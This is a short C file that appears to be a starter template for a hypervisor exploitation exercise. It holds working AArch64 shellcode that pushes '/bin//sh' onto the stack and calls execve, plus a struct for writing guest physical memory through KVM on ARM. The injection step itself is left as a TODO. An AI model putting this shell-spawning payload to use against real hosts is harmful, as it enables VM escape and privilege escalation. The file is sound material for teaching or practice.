#include <stdint.h>

struct kvm_arm_write_gpa_args {
	uint32_t vmid;
	uint64_t gpa;
	uint64_t buf;
	uint64_t size;
};

extern void shellcode();
__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0");

int main(int argc, char *argv[])
{
	struct kvm_arm_write_gpa_args wgpa = {
		.buf = (unsigned long)&shellcode,
	};
	// TODO: implement your shellcode injection attack
}


